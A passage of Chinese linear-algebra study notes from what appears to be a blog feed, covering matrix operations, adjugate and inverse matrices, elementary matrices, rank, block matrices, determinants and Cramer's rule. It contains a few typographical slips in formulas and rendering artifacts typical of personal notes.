<h4 id="矩阵的运算"><a href="#矩阵的运算" class="headerlink" title="矩阵的运算"></a>矩阵的运算</h4><p><strong>加减法</strong> 两个同型矩阵（行数与列数分别相等）可以相加减，且$A\pm B=[a_{ij}]_{m\times n}\pm[b_{ij}]_{m\times n}=[a_{ij}\pm b_{ij}]_{m\times n}$<br><strong>数乘</strong> 设 k 是数，$A=(a_{ij})_{m\times n}$是矩阵，则定义数与矩阵的乘法为$kA=(ka_{ij})_{m\times n}$(k为常数)<br><strong>乘法</strong> 设 $A_{m\times n}=(a_{ik})_{m\times n},B_{n\times x}=(b_{kj})_{n\times s}$，则$AB=(C_{i\times j})_{m\times s}$，其中</p>
<script type="math/tex; mode=display">c_{ij}=\sum_{k=1}^{s}a_{ik}b_{kj}=a_{i1}b_{1j}+a_{i2}b_{2j}+\dotsb+a_{in}b_{nj}(i=1,2,\dotsb,m;j=1,2,\dotsb,s)</script><p><img src="/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5/矩阵运算.png" alt="图片"></p>
<p><strong>运算法则</strong> </p>
<ol>
<li><em>(加法)</em> A,B,C是同型矩阵，则<script type="math/tex; mode=display">A+B=B+A \\
(A+B)+C=A+(B+C) \\
A+O=A\\
A+(-A)=O</script></li>
<li><em>(数乘矩阵)</em> <script type="math/tex">k(mA)=(km)A=m(kA);(k+m)A=kA+mA\\k(A+B)=kA+kB;1A=A,0A=O</script></li>
<li><em>(乘法)</em> A,B,C满足运算条件时<script type="math/tex">(AB)C=A(BC)\\A(B+C)=AB+AC\\(B+C)A=BA+CA</script></li>
</ol>
<h4 id="矩阵转置的运算公式"><a href="#矩阵转置的运算公式" class="headerlink" title="矩阵转置的运算公式"></a>矩阵转置的运算公式</h4><ol>
<li>$(A^T)^T=A$</li>
<li>$(kA)^T=kA^T$</li>
<li>$(A\pm B)^T=A^T\pm B^T$</li>
<li>$(AB)^T=B^TA^T$</li>
<li>$(A^{-1})^T=(A^T)^{-1}$</li>
<li>$(A^T)^m=(A^m)^T$</li>
</ol>
<h3 id="伴随矩阵"><a href="#伴随矩阵" class="headerlink" title="伴随矩阵"></a>伴随矩阵</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>由矩阵 A 的行列式 |A| 所有代数余子式所构成的形如</p>
<script type="math/tex; mode=display">\begin{bmatrix}
    A_{11} &A_{21} &\dotsb &A_{n1} \\
    A_{12} &A_{22} &\dotsb &A_{n2} \\
    \vdots &\vdots & &\vdots \\
    A_{1n} &A_{2n} &\dotsb &A_{nn}
\end{bmatrix}</script><p>的矩阵称为矩阵A的伴随矩阵，记为$A^*$</p>
<h4 id="伴随矩阵的公式"><a href="#伴随矩阵的公式" class="headerlink" title="伴随矩阵的公式"></a>伴随矩阵的公式</h4><script type="math/tex; mode=display">AA^*=A^*A=|A|E\\(A^*)^{-1}=(A^{-1})^*=\frac{1}{|A|}A (|A|\not ={0})\\(kA)^*=k^{n-1}A^*\\(A^*)^T=(A^T)^*\\|A^*|=|A|^{n-1}\\(A^*)^*=|A|^{n-2}A (n\ge 2)\\(AB)^*=B^*A^*</script><p><img src="/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5/转置矩阵-2.png" alt="图片"><br><img src="/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5/转置矩阵-3.png" alt="图片"></p>
<h4 id="2阶矩阵的伴随矩阵"><a href="#2阶矩阵的伴随矩阵" class="headerlink" title="2阶矩阵的伴随矩阵"></a>2阶矩阵的伴随矩阵</h4><p>设$A=\begin{bmatrix}<br>    a &amp;b \\<br>    c &amp;d<br>\end{bmatrix},|A|=\left |\begin{array}{cccc}<br>    a &amp;b \\<br>    c &amp;d<br>\end{array} \right |\ne0$，则$A^*=\begin{bmatrix}<br>    A_{11} &amp;A_{21} \\<br>    A_{12} &amp;A_{22}<br>\end{bmatrix}=\begin{bmatrix}<br>    d &amp;-b \\<br>    -c &amp;a<br>\end{bmatrix}$</p>
<h4 id="伴随矩阵的秩"><a href="#伴随矩阵的秩" class="headerlink" title="伴随矩阵的秩"></a>伴随矩阵的秩</h4><p>设 A 是 n 阶矩阵，则 $r(A^*)=\begin{cases}<br>    n,r(A)=n,\\<br>    1,r(A)=n-1,(n\ge2),\\<br>    0,r(A)&lt;n-1<br>\end{cases}$<br><img src="/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5/伴随矩阵.png" alt="图片"></p>
<h3 id="可逆矩阵"><a href="#可逆矩阵" class="headerlink" title="可逆矩阵"></a>可逆矩阵</h3><p><strong>定义</strong> 设 A 是 n 阶矩阵，如果存在 n 阶矩阵 B 使得$AB=BA=E$成立，则称 A 是可逆矩阵或非奇异矩阵，B 是 A 的逆矩阵，记成$A^{-1}=B$<br><strong>定理</strong> 若 A 可逆，则 A 的逆矩阵唯一</p>
<p><strong>定理</strong> A 可逆$\Leftrightarrow|A|\not ={0}$<br><strong>证明</strong> $\Rightarrow$ 设 A 可逆，由矩阵可逆的定义，存在 B ，使得 $BA=E$，两边取行列式得 $|B|\cdot|A|=1$，于是 $|A|\ne0$<br>$\Leftarrow$ 设 $|A|\ne0$，由 $AA^<em>=A^</em>A=|A|E$ 得 $A\cdot\frac{1}{|A|}A^<em>=\frac{1}{|A|}A^</em>\cdot A=E$，由矩阵可逆的定义得A可逆，且 $A^{-1}=\frac{1}{|A|}A^*$</p>
<p><strong>定理</strong> 设 A 和 B 是 n 阶矩阵 且 AB = E，则BA = E</p>
<h4 id="n-阶矩阵-A-可逆的充分必要条件"><a href="#n-阶矩阵-A-可逆的充分必要条件" class="headerlink" title="n 阶矩阵 A 可逆的充分必要条件"></a>n 阶矩阵 A 可逆的充分必要条件</h4><ol>
<li>存在 n 阶矩阵 B ，使得 AB=E（或BA=E）</li>
<li>$|A|\ne0$,或秩$r(A)=n$，或 A 的列（行）向量线性无关</li>
<li>齐次方程组 $Ax=0$只有零解</li>
<li>$\forall b$，非齐次线性方程组$Ax=b$总有唯一解</li>
<li>矩阵 A 的特征值全不为0</li>
</ol>
<h4 id="求逆矩阵的方法"><a href="#求逆矩阵的方法" class="headerlink" title="求逆矩阵的方法"></a>求逆矩阵的方法</h4><p><strong>方法一</strong> 用公式，若$|A|\ne0$，则$A^{-1}=\frac{1}{|A|}A^<em>$<br><strong>方法二</strong> 初等变换法 $(A\vdots E)\underrightarrow{初等行变换}(E\vdots A^{-1})$<br><strong>方法三</strong> 用定义求B，使$AB=E$或$BA=E$，则$A$可逆，且$A^{-1}=B$<br><em>*方法四</em></em> 用分块矩阵 设B，C都是可逆矩阵，则<script type="math/tex">\begin{bmatrix}
    B &O \\
    O &C \\
\end{bmatrix}^{-1}=\begin{bmatrix}
    B^{-1} &O \\
    O &C^{-1} \\
\end{bmatrix};\begin{bmatrix}
    O &B \\
    C &O \\
\end{bmatrix}^{-1}=\begin{bmatrix}
    O &C^{-1} \\
    B^{-1} &O \\
\end{bmatrix}</script></p>
<h4 id="逆矩阵的运算性质"><a href="#逆矩阵的运算性质" class="headerlink" title="逆矩阵的运算性质"></a>逆矩阵的运算性质</h4><p>(1) $k\ne0$，则$(kA)^{-1}=\frac{1}{k}A^{-1}$；<br>(2) 若A，B可逆，则$(AB)^{-1}=B^{-1}A^{-1}$，特别地$(A^2)^{-1}=(A^{-1})^2$；<br>(3) 若$A^T$可逆，则$(A^T)^{-1}=(A^{-1})^T$;<br>(4) $(A^{-1})^{-1}=A$;<br>(5) $|A^{-1}|=\frac{1}{|A|}$<br>(6) $(A^T)^{-1}=(A^{-1})^T$</p>
<p><strong>注意</strong> 即使A,B和A+B都可逆，一般地$(A+B)^{-1}\ne A^{-1}+B^{-1}$</p>
<h3 id="初等矩阵"><a href="#初等矩阵" class="headerlink" title="初等矩阵"></a>初等矩阵</h3><h4 id="初等变换与初等矩阵的概念"><a href="#初等变换与初等矩阵的概念" class="headerlink" title="初等变换与初等矩阵的概念"></a>初等变换与初等矩阵的概念</h4><p><strong>定义(初等变换)</strong> 设A是$ m \times n$矩阵<br>(1) 用某个非零常数$k(k\ne0)$乘A的某行（列）的每个元素；<br>(2) 互换A的某两行（列）的位置；<br>(3) 将A的某行（列）元素的k倍加到另一行（列），<br>称为矩阵的三种初等行（列）变换，且分别称为初等倍乘、互换、倍加行（列）变换，统称初等变换</p>
<p><strong>定义(初等矩阵)</strong> 由单位矩阵经一次初等变换得到的矩阵称为初等矩阵，它们分别是</p>
<ol>
<li><strong>倍乘初等矩阵</strong>，将单位矩阵 E 的第 i 行（或第 j 列）乘以非零常数 k 所得到的矩阵，记为 $E(i(k))$.如<script type="math/tex; mode=display">E(2(k))=\begin{bmatrix}
 1 &0 & 0\\
 0 &k &0 \\
 0 &0 &1
\end{bmatrix}</script>性质：<br>(1) $E_i(k)A$ 本质上即矩阵 A 的i 行乘以非零常数 k<br>(2) $AE_i(k)$ 本质上即矩阵 A 的 i 列乘以非零常数 k<br>(3) $|E_i(k)|=k\ne0$，即$E_i(k)$ 可逆<br>(4) $[E_i(c)]^{-1}=E_i(\frac{1}{k})$</li>
<li><strong>互换初等矩阵</strong>，将单位矩阵 E 的第 i 行和第 j 行对调（或者将第 i 列与第 j 列对调）所得到的矩阵，记为 $E(i,j)$.如：<script type="math/tex; mode=display">E(1,2)=\begin{bmatrix}
 0 &1 & 0 \\
 1 &0 & 0 \\
 0 &0 &1
\end{bmatrix}</script>性质：<br>(1) $E_{i,j}A$ 本质上即对调矩阵 A 的 i,j 行<br>(2) $AE_{i,j}$ 本质上即对调矩阵 A 的 i,j 列<br>(3) $|E_{i,j}|=-1\ne0$，即$E_{i,j}$ 可逆<br>(4) $(E_{i,j})^{-1}=E_{i,j}$<br>(5) $(E_{i,j})^2=E$</li>
<li><strong>倍加初等矩阵</strong>，将单位矩阵 E 的第 j 行的 k 倍加到第 i 行（或将单位矩阵 E 的第 i 列的 k 倍加到 j 列）所得到的矩阵，记为 $E(ij(k))$.如：<script type="math/tex; mode=display">E(31(k))=\begin{bmatrix}
 1 &0 &0 \\
 0 &1 & 0 \\
 k &0 &1
\end{bmatrix}</script>性质：<br>(1) $E_{ij}(k)A$ 本质上即矩阵 A 的 j 行 的 k 倍加到 i 行<br>(2) $AE_{ij}(k)$ 本质上即矩阵 A 的 i 列的 k 倍 加到 j 列<br>(3) $|E_{ij}(k)=1\ne0$，即 $E_{ij}(k)$ 可逆<br>(4) $[E_{ij}(k)]^{-1}=E_{ij}(-k)$</li>
</ol>
<p><strong>定义(等价矩阵)</strong> 矩阵A经过有限次初等变换变成矩阵B，则称A与B等价，记成$a\cong B$.若<br>$A\cong\begin{bmatrix}<br>    E_r &amp;O \\<br>    O &amp;O<br>\end{bmatrix}$，则后者称为A的等价标准形</p>
<h4 id="初等矩阵与初等矩阵变换的性质"><a href="#初等矩阵与初等矩阵变换的性质" class="headerlink" title="初等矩阵与初等矩阵变换的性质"></a>初等矩阵与初等矩阵变换的性质</h4><ol>
<li>初等矩阵的转置仍是初等矩阵</li>
<li>初等矩阵均是可逆阵，且其逆矩阵仍是初等矩阵<script type="math/tex; mode=display">E(i,j)^{-1}=E(i,j)\\E(i(k))^{-1}=E(i(\frac{1}{k}))\\E(ij(k))^{-1}=E(ij(-k))</script></li>
<li>用初等矩阵P左乘（右乘）A，其结果PA（AP），相当于对A做相应的初等行（列）变换</li>
</ol>
<p><strong>定理</strong> 矩阵A可逆的充分必要条件是它能表示成一些初等矩阵的乘积$P_N\dotsb P_2P_1A=E$</p>
<h4 id="行阶梯矩阵，行最简矩阵"><a href="#行阶梯矩阵，行最简矩阵" class="headerlink" title="行阶梯矩阵，行最简矩阵"></a>行阶梯矩阵，行最简矩阵</h4><p><strong>行阶梯矩阵</strong></p>
<ol>
<li>如果矩阵中有零行（即这一行元素全是0），则零行在矩阵的底部</li>
<li>每个非零行的主元（即该行最左边的第一个非零元），它们的列指标随着行指标的递增而严格增大</li>
</ol>
<p><strong>行最简矩阵</strong> 一个行阶梯矩阵，如果还满足：非零行的主元都是1，且主元所在的列的其他元素都是0，则为行最简矩阵</p>
<h3 id="矩阵的秩"><a href="#矩阵的秩" class="headerlink" title="矩阵的秩"></a>矩阵的秩</h3><p><strong>定义</strong> 在$m\times n$矩阵A中，任取k行与k列$k\le m,k\le n$，位于这些行与列的交叉点上的$k^2$个元素按其在原来矩阵A中的次序可构成一个k阶行列式，称其为矩阵A的k阶<em>子式</em><br><strong>定义</strong> （矩阵的秩）设A是$m\times n$矩阵，若A中存在r阶子式不等于零，r阶以上子式均等于零，则称矩阵A的秩为r，记成r(A)，零矩阵的秩规定为0<br>秩$r(A)=r\Leftrightarrow$矩阵A中非零子式的最高阶数是r<br>$r(A)&lt;r\Leftrightarrow A$中每一个r阶子式全为0<br>$r(A)\ge r\Leftrightarrow A$中有r阶子式不为0<br>特别的，$r(A)=0\Leftrightarrow A=O,A\ne0\Leftrightarrow r(A)\ge1$<br>若 A 是 n 阶矩阵，$r(A)=n\Leftrightarrow|A|\ne0\Leftrightarrow A$可逆。$r(A)&lt;n\Leftrightarrow|A|=0\Leftrightarrow A$不可逆<br>若 A 是 $m\times n$矩阵，则$r(A)\le min(m,n).$</p>
<p><strong>定理</strong> 经初等变换矩阵的秩不变</p>
<h4 id="矩阵秩的求法"><a href="#矩阵秩的求法" class="headerlink" title="矩阵秩的求法"></a>矩阵秩的求法</h4><ol>
<li>矩阵的秩本质上即为方程组约束条件的个数</li>
<li>$r(A)=0$ 的充分必要条件是 $A=O$</li>
<li>$r(A)\ge1$ 的充分必要条件是 $A\ne O$</li>
<li>$r(A)\ge2$ 的充分必要条件是 A 至少两行不成比例</li>
</ol>
<h4 id="矩阵秩的性质"><a href="#矩阵秩的性质" class="headerlink" title="矩阵秩的性质"></a>矩阵秩的性质</h4><ol>
<li>$r(A)=r(A^T)=r(A^TA)=r(AA^T)$.</li>
<li>设 $A,B$ 是同型矩阵，则 $|r(A)-r(B)|\le r(A\pm B)\le r(A)+r(B)$</li>
<li>设 A 为 $m\times n$ 矩阵，B 为 $n\times s$ 矩阵，则 $r(AB)\le min(r(A),r(B))$</li>
<li>若 A 是 $m\times n$ 矩阵，B 是 $n\times s$ 矩阵，$AB=O$，则$r(A)+r(B)\le n$</li>
<li>设 A 是 $m\times n$ 矩阵，$P,Q$ 分别为 m 及 n 阶可逆矩阵，则 $r(A)=r(PA)=r(AQ)=r(PAQ)$</li>
<li>设 A 是 n 阶矩阵，则 $r(A^*)=\begin{cases}<br> n,r(A)=n,\\<br> 1,r(A)=n-1,(n\ge2),\\<br> 0,r(A)&lt;n-1<br>\end{cases}$</li>
<li><ol>
<li>分块矩阵$r\begin{pmatrix}<br>A &amp;O\\<br>O &amp;B<br>\end{pmatrix}=r(A)+r(B)$<ol>
<li>设A,B 分别为 $m\times n,n\times s$ 矩阵，则 $max({r(A),r(B)})\le r(A\vdots B)\le r(A)+r(B)$</li>
</ol>
</li>
</ol>
</li>
<li>设 A 为 n 阶非零矩阵，则r(A)=1的充分必要条件是，存在非零向量$\alpha,\beta$，使得 $A=\alpha\beta^T$</li>
</ol>
<p><strong>定理</strong> （三秩相等）设 A 是 $m\times n$ 矩阵，将 A 以行及列分块，得$A_{m\times n}=\begin{bmatrix}<br>    \alpha_1 \\<br>    \alpha_2 \\<br>    \vdots \\<br>    \alpha_m<br>\end{bmatrix}=[\beta_1,\beta_2,\dotsb,\beta_n]$，则有$r(A)=r(\alpha_1,\alpha_2,\dotsb,\alpha_m)=r(\beta_1,\beta_2,\dotsb,\beta_n)$</p>
<h3 id="分块矩阵"><a href="#分块矩阵" class="headerlink" title="分块矩阵"></a>分块矩阵</h3><h4 id="分块矩阵的概念"><a href="#分块矩阵的概念" class="headerlink" title="分块矩阵的概念"></a>分块矩阵的概念</h4><p>将矩阵用若干纵线和横线分成许多小块，每一小块称为原矩阵的子矩阵（或子块），把子块看成原矩阵的一个元素，则原矩阵叫分块矩阵</p>
<h4 id="分块矩阵的运算"><a href="#分块矩阵的运算" class="headerlink" title="分块矩阵的运算"></a>分块矩阵的运算</h4><p>运算法则：</p>
<script type="math/tex; mode=display">\begin{bmatrix}
    A_1 &A_2 \\
    A_3 &A_4
\end{bmatrix}+\begin{bmatrix}
    B_1 &B_2 \\
    B_3 &B_4
\end{bmatrix}=\begin{bmatrix}
    A_1+B_1 &A_2+B_2 \\
    A_3+B_3 &A_4+B_4
\end{bmatrix} \\ \begin{bmatrix}
    A &B \\
    C &D
\end{bmatrix}\begin{bmatrix}
    X &Y \\
    Z &W
\end{bmatrix} = \begin{bmatrix}
    AX+BZ &AY+BW \\
    CX+DZ &CY+DW
\end{bmatrix} \\ \begin{bmatrix}
    A &B \\
    C &D
\end{bmatrix}^T=\begin{bmatrix}
    A^T &C^T \\
    B^T &D^T
\end{bmatrix}</script><p>若B，C分别是m阶和s阶矩阵，则</p>
<script type="math/tex; mode=display">\begin{bmatrix}
    B &O \\
    O &C
\end{bmatrix}^n=\begin{bmatrix}
    B^n &O\\
    O &C^n
\end{bmatrix}</script><p>若B,C分别是m阶和n阶可逆矩阵，则</p>
<script type="math/tex; mode=display">\begin{bmatrix}
    B &O \\
    O &C
\end{bmatrix}^{-1}=\begin{bmatrix}
    B^{-1} &O \\
    O &C^{-1}
\end{bmatrix},\begin{bmatrix}
    O &B \\
    C &O
\end{bmatrix}^{-1}=\begin{bmatrix}
    O &C^{-1} \\
    B^{-1} &O
\end{bmatrix}</script>]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>线性代数</tag>
      </tags>
  </entry>
  <entry>
    <title>线性代数-行列式</title>
    <url>/2021/04/30/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E8%A1%8C%E5%88%97%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="行列式的基本概念与性质"><a href="#行列式的基本概念与性质" class="headerlink" title="行列式的基本概念与性质"></a>行列式的基本概念与性质</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><h4 id="行列式的定义"><a href="#行列式的定义" class="headerlink" title="行列式的定义"></a>行列式的定义</h4><script type="math/tex; mode=display">D=\begin{bmatrix}
    a_{11} &a_{12} &\dots &a_{1n} \\
    a_{21} &a_{22} &\dots &a_{2n} \\
    \vdots &\vdots & &\vdots \\
    a_{n1}& a_{n2} &\dots &a_{nn}
\end{bmatrix}=\sum_{j_1,j_2,\dotsb,j_n}(-1)^{\tau(j_1,j_2,\dotsb,j_n)}a_{1j_1}a_{2j_2}\dotsb,a_{2j_n}</script><p>其中$\tau(j_1j_2..j_n)$表示排列$j_1j_2…j_n$的<em>逆序数</em>，即|A|是所有在不同行、不同列的n个元素乘积的代数和</p>
<p>偶排列：一个排列的逆序数是偶数<br>奇排列：一个排列的逆序数是奇数</p>
<h4 id="行列式按行（列）展开公式"><a href="#行列式按行（列）展开公式" class="headerlink" title="行列式按行（列）展开公式"></a>行列式按行（列）展开公式</h4><script type="math/tex; mode=display">|A|=a_{i1}A_{i1}+a_{i2}A_{i2}+...+a_{in}A_{in} = \sum_{k=1}^{n}a_{ik}A_{ik},i=1,2,..,n \\
    |A|=a_{1j}A_{1j}+a_{2j}A_{2j}+...+a_{nj}A_{nj} = \sum_{k=1}^{n}a_{kj}A_{kj},j=1,2,..,n</script><p>其中$A_{ij}$为$a_{ij}$的代数余子式，即$A_{ij}=(-1)^{i+j}M_{ij}$，$M_{ij}$为|A|中去掉第 i 行及 第 j 列元素后的 n - 1 阶行列式<br>说明：<br>行列式的任一行（列）元素与另一行（列）元素的代数余子式乘积之和为0，即</p>
<script type="math/tex; mode=display">\sum_{k=1}^na_{ik}A_{jk}=a_{i1}A_{j1}+a_{i2}A_{j2}+...+a_{in}A_{jn} = 0,i\not ={j} \\
\sum_{k=1}^na_{ki}A_{kj}=a_{1i}A_{1j}+a_{2i}A_{2j}+...+a_{ni}A_{nj} = 0,i\not ={j}</script><span id="more"></span>
<h4 id="行列式的性质"><a href="#行列式的性质" class="headerlink" title="行列式的性质"></a>行列式的性质</h4><p>记$|A|=\left |\begin{array}{cccc}<br>    a_{11} &amp;a_{12} &amp;\dots &amp;a_{1n} \\<br>    a_{21} &amp;a_{22} &amp;\dots &amp;a_{2n} \\<br>    \vdots &amp;\vdots &amp; &amp;\vdots \\<br>    a_{n1}&amp; a_{n2} &amp;\dots &amp;a_{nn}\\<br>\end{array}\right|<br>,\lvert A^T\rvert=\left |\begin{array}{cccc}<br>    a_{11} &amp;a_{21} &amp;\dots &amp;a_{n1} \\<br>    a_{12} &amp;a_{22} &amp;\dots &amp;a_{n2} \\<br>    \vdots &amp;\vdots &amp; &amp;\vdots \\<br>    a_{1n}&amp; a_{2n} &amp;\dots &amp;a_{nn}\\<br>\end{array}\right|$，<br>行列式 $\lvert A^T\rvert$ 称为|A|的转置行列式</p>
<ol>
<li>经过转置行列式的值不变，即 $|A^T|=|A|$</li>
<li>两行（或列）互换位置，行列式的值变号，特别地，两行（或列）相同，行列式的值为0</li>
<li>某行（或列）如有公因子k，则可把k提出行列式记号外。<br> (1)某行（或列）的元素全为0，行列式的值为0<br> (2)若两行（或列）的元素对应成比例，行列式的值为0</li>
<li>如果行列式某行（或列）是两个元素之和，则可把行列式拆成两个行列式之和<script type="math/tex; mode=display">\left | \begin{array}{cccc}
     a_1+b_1 &a_2+b_2 &a_3+b_3 \\
     c_1 &c_2 &c_3 \\
     d_1 &d_2 &d_3 \\
 \end{array} \right | = \left | \begin{array}{cccc}
     a_1 &a_2 &a_3 \\
     c_1 &c_2 &c_3 \\
     d_1 &d_2 &d_3 \\
 \end{array} \right | + \left | \begin{array}{cccc}
     b_1 &b_2 &b_3 \\
     c_1 &c_2 &c_3 \\
     d_1 &d_2 &d_3 \\
 \end{array} \right |</script></li>
<li>把某行（或列）的k倍加到另一行（或列），行列式的值不变<script type="math/tex; mode=display">\left | \begin{array}{cccc}
     a_1 &a_2 &a_3 \\
     b_1 &b_2 &b_3 \\
     c_1 &c_2 &c_3 \\
 \end{array} \right | = \left | \begin{array}{cccc}
     a_1 &a_2 &a_3 \\
     b_1+ka_1 &b_2+ka_2 &b_3+ka_3 \\
     c_1 &c_2 &c_3 \\
 \end{array} \right |</script></li>
</ol>
<h4 id="有关行列式的重要公式"><a href="#有关行列式的重要公式" class="headerlink" title="有关行列式的重要公式"></a>有关行列式的重要公式</h4><p>(1) $\lvert A^T\rvert=\lvert A\rvert$;<br>(2) 若A是n阶矩阵，则$\lvert kA\rvert=k^n\lvert A\rvert$;<br>(3) 若A、B是同型矩阵，$\lvert AB\rvert=\lvert A\rvert\cdot\lvert B\rvert$;<br>(4) 若A是n阶可逆矩阵，$\lvert A^{-1}\rvert=\frac{1}{\lvert A\rvert}$;<br>(5) 若A是n阶矩阵，$\lvert A^<em>\rvert=\lvert A\rvert^{n-1}$<br>(7) $AA^</em>=A^*A=|A|E$<br>(6) 若A是n阶矩阵，且A的特征值为$\lambda_1,\lambda_2,\dotsb,\lambda_n$，则$|A|=\lambda_1\lambda_2\dotsb\lambda_n$<br>(8) 若A与B矩阵相似，则$|A|=|B|$</p>
<h3 id="重要的行列式及定理"><a href="#重要的行列式及定理" class="headerlink" title="重要的行列式及定理"></a>重要的行列式及定理</h3><ol>
<li>对角形行列式<script type="math/tex; mode=display">\begin{bmatrix}
 a_{11} &0 &\dotsb & 0 \\
 0 &a_{22} &\dotsb &0 \\
 \vdots &\vdots & &\vdots \\
 0 &0 &\dotsb &a_{nn}
\end{bmatrix}=a_{11}a_{22}\dotsb a_{nn}</script></li>
<li>上（下）三角形行列式的值等于主对角线元素的乘积<script type="math/tex; mode=display">\left | \begin{array}{cccc}
 a_{11} &a_{12} &\cdots &a_{1n} \\
 0 &a_{22} &\cdots &a_{2n} \\
 0 &0 &\ddots &\vdots \\
 0 &0 &0 &a_{nn} \\
\end{array} \right | ==\left | \begin{array}{cccc}
 a_{11} &0 &0 &0 \\
 a_{21} &a_{22} &0 &0 \\
 \vdots &\vdots &\ddots &0 \\
 a_{n1} &a_{n2} &\cdots &a_{nn} \\
\end{array} \right | = a_{11}a_{22}\cdots a_{nn}</script></li>
<li>关于副对角线的行列式<script type="math/tex; mode=display">\left | \begin{array}{cccc}
 a_{11} &a_{12} &\dots &a_{1,n-1} &a_{1n} \\
 a_{21} &a_{22} &\dots &a_{2,n-1} &0 \\
 \vdots &\vdots & &\vdots &\vdots \\
 a_{n1} &0 &\dots &0 &0 \\
\end{array} \right | = \left | \begin{array}{cccc}
 0 &\dots &0 &a_{1n} \\
 0 &\dots &a_{2,n-1} &a_{2n} \\
 \vdots & &\vdots &\vdots \\
 a_{n1} &\dots &a_{n,n-1} &a_{nn} \\
\end{array} \right | = (-1)^{\frac{n(n-1)}{2}}a_{1n}a_{2,n-1}\dots a_{n1}</script></li>
<li>两个特殊的拉普拉斯展开式<script type="math/tex; mode=display">\left | \begin{array}{cccc}
 A &\ast \\
 O &B \\
\end{array} \right | = \left | \begin{array}{cccc}
 A &O \\
 \ast &B \\
\end{array} \right | = |A| \cdot|B|,\left | \begin{array}{cccc}
 O &A \\
 B &\ast \\
\end{array} \right | = \left | \begin{array}{cccc}
 \ast &A \\
 B &O \\
\end{array} \right | = (-1)^{mn}|A|\cdot|B|</script></li>
<li>范德蒙行列式<script type="math/tex; mode=display">\left | \begin{array}{cccc}
 1 &1 &\cdots &1 \\
 x_1 &x_2 &\cdots &x_n \\
 x_1^2 &x_2^2 &\cdots &a_n^2 \\
 \vdots &\vdots & &\vdots \\
 x_1^{n-1} &x_2^{n-1} &\cdots &x_n^{n-1} \\
\end{array} \right |=\prod_{1\le j<i\le n}(x_i-x_j)</script></li>
<li>箭形行列式<ol>
<li>一般地，箭形行列式<script type="math/tex; mode=display">D_{n+1}=\left |\begin{array}{cccc}
 \lambda_0 &a_1 &a_2 &\dotsb &a_n \\
 b_1 &\lambda_1 &0 &\dotsb &0 \\
 b_2 &0 &\lambda_2 &\dotsb &0 \\
 \vdots &\vdots &\vdots &\ddots &\vdots \\
  b_n &0 &0 &\dotsb &\lambda_n
\end{array}\right |=\left |\begin{array}{cccc}
 \lambda_0-\sum_{i=1}^n\frac{b_ia_i}{\lambda_i} &a_1 & a_2 &\dotsb &a_n \\
 0 &\lambda_1 &0 &\dotsb &0 \\
 0 &0 &\lambda_2 &\dotsb &0 \\
 \vdots &\vdots &\vdots &\ddots &\vdots \\
 0 &0 &0 &\dotsb &\lambda_n
\end{array} \right |\\=(\lambda_0-\sum_{i=1}^n\frac{b_ia_i}{\lambda_i})\cdot \lambda_1\lambda_2\dotsb\lambda_n(\lambda_i\ne0,i=1,2,\dotsb,n)</script>若$\lambda_i=0(i=1,2,\dotsb,n)$，则$D_{n+1}=0$</li>
<li>其他箭形行列式也可类似的计算</li>
</ol>
</li>
</ol>
<h2 id="克拉默法则"><a href="#克拉默法则" class="headerlink" title="克拉默法则"></a>克拉默法则</h2><p>对线性方程组</p>
<script type="math/tex; mode=display">\begin{cases}
    a_{11}x_1+a_{12}x_2+\cdots+a_{1n}x_n = 0 \\
    a_{21}x_1+a_{22}x_2+\cdots+a_{2n}x_n = 0 \\
    \cdots\cdots \\
    a_{n1}x_1+a_{n2}x_2+\cdots+a_{nn}x_n=0 \\
\end{cases}\tag{I}</script><p>及</p>
<script type="math/tex; mode=display">\begin{cases}
    a_{11}x_1+a_{12}x_2+\cdots+a_{1n}x_n = b_1 \\
    a_{21}x_1+a_{22}x_2+\cdots+a_{2n}x_n = b_2 \\
    \cdots\cdots \\
    a_{n1}x_1+a_{n2}x_2+\cdots+a_{nn}x_n=b_n
\end{cases}\tag{II}</script><p>其中(II)称为非齐次线性方程组,(I)称为(II)对应的齐次线性方程组或(II)的导出方程组<br>令$D=\left | \begin{array}{cccc}<br>        a_{11} &amp;a_{12} &amp;\dotsb &amp;a_{1n} \\<br>        a_{21} &amp;a_{22} &amp;\dotsb &amp;a_{2n} \\<br>        \vdots &amp;\vdots &amp; &amp;\vdots \\<br>        a_{n1} &amp;a_{n2} &amp;\dotsb &amp;a_{nn} \\<br>    \end{array} \right |,D_1=\left | \begin{array}{cccc}<br>        b_{1} &amp;a_{12} &amp;\dotsb &amp;a_{1n} \\<br>        b_{2} &amp;a_{22} &amp;\dotsb &amp;a_{2n} \\<br>        \vdots &amp;\vdots &amp; &amp;\vdots \\<br>        b_{n} &amp;a_{n2} &amp;\dotsb &amp;a_{nn} \\<br>    \end{array} \right |,\dotsb,D_n=\left | \begin{array}{cccc}<br>        a_{11} &amp;a_{12} &amp;\dotsb &amp;b_{1} \\<br>        a_{21} &amp;a_{22} &amp;\dotsb &amp;b_{2} \\<br>        \vdots &amp;\vdots &amp; &amp;\vdots \\<br>        a_{n1} &amp;a_{n2} &amp;\dotsb &amp;b_{n} \\<br>    \end{array} \right |$<br>其中D称为系数行列式，我们有<br><strong>定理1</strong> 方程组(I)只有零解的充分必要条件是$D\ne0$<br>方程组(I)有非零解(或者(I)有无穷多个解)的充分必要条件是$D=0$<br><strong>定理2</strong> 方程组(II)有唯一解的充分必要条件是$D\ne0$,此时$x=\frac{D_i}{D}(i=1,2,\dotsb,n)$,当$D=0$时，方程组(II)要么无解，要么有无穷多个解<br><img src="/2021/04/30/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E8%A1%8C%E5%88%97%E5%BC%8F/克拉默法则.png" alt="图片"></p>
<h2 id="讨论-A-0的问题"><a href="#讨论-A-0的问题" class="headerlink" title="讨论|A|=0的问题"></a>讨论|A|=0的问题</h2><ol>
